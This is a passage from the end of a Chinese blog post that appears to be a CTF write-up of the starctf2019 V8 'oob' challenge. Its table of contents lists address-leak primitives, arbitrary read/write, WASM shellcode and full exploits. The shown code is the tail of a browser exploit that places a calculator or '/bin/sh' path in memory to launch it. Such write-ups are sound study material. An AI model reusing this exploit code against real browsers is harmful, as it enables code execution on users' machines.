class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    <span class="comment">//get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\x00</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x69622fn</span>), <span class="literal">true</span>); <span class="comment">// /snap/bi</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">3</span>, i2f(<span class="number">0x2d656d6f6e672f6en</span>), <span class="literal">true</span>); <span class="comment">// n/gnome-</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">11</span>, i2f(<span class="number">0x74616c75636c6163n</span>), <span class="literal">true</span>); <span class="comment">// calculat</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">19</span>, i2f(<span class="number">0x726fn</span>), <span class="literal">true</span>); <span class="comment">// or</span></span><br><span class="line">&#125;</span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/news/203721.html" >https://www.freebuf.com/news/203721.html<i class="fas fa-external-link-alt"></i></a></p>

        </div>

        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">#浏览器</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">#漏洞分析</a>&nbsp;
                    </li>
                
            </ul>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2021/04/30/CVE-2021-21220/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">CVE-2021-21220</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;Comments</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'oP8c99sduOuJjyeVoKafuweh-gzGzoHsz',
                    appKey: 'TwXXvHbKxF0DVsXV22S2uRVG',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '欢迎大家吐槽~',
                    lang: 'en'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = 'fa1lr4in';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>
              -
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">fa1lr4in</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#starctf2019-oob"><span class="nav-text">starctf2019-oob</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0"><span class="nav-text">1、环境复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81diff%E5%88%86%E6%9E%90"><span class="nav-text">2、diff分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">3、分析利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E7%BC%96%E5%86%99addressOf%E5%92%8CfakeObject%E5%8E%9F%E8%AF%AD"><span class="nav-text">4、编写addressOf和fakeObject原语</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what"><span class="nav-text">what</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#why"><span class="nav-text">why</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#how"><span class="nav-text">how</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%E3%80%81%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E5%8E%9F%E8%AF%AD"><span class="nav-text">5、构造任意读写原语</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6%E3%80%81%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E5%BD%92%E7%BA%B3"><span class="nav-text">6、利用思路归纳</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7%E3%80%81WASM%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">7、WASM方式进行漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%94%A8%E6%B3%95"><span class="nav-text">简单用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8wasm%E6%89%A7%E8%A1%8Cshellcode"><span class="nav-text">利用wasm执行shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp%E5%A6%82%E4%B8%8B"><span class="nav-text">完整exp如下</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#x64%E5%A6%82%E4%B8%8B"><span class="nav-text">x64如下</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x86%E5%A6%82%E4%B8%8B"><span class="nav-text">x86如下</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8%E3%80%81%E4%BC%A0%E7%BB%9F%E5%A0%86%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8Fexp%E6%9E%84%E9%80%A0"><span class="nav-text">8、传统堆利用方式exp构造</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="nav-text">利用步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E7%A8%8B%E5%BA%8F%E5%9F%BA%E5%9D%80%E4%BB%A5%E5%8F%8Agot%E8%A1%A8%E5%90%84%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-text">计算程序基址以及got表各函数地址</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96d8-base-addr"><span class="nav-text">获取d8_base_addr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96d8-got-libc-start-main-addr"><span class="nav-text">获取d8_got_libc_start_main_addr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96libc-start-main-addr"><span class="nav-text">获取libc_start_main_addr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96libc-base-addr"><span class="nav-text">获取libc_base_addr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96libc-system-addr%E5%92%8Clibc-free-hook-addr"><span class="nav-text">获取libc_system_addr和libc_free_hook_addr</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp%E5%A6%82%E4%B8%8B-1"><span class="nav-text">完整exp如下</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>




<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
    
</div>



</body>
</html>
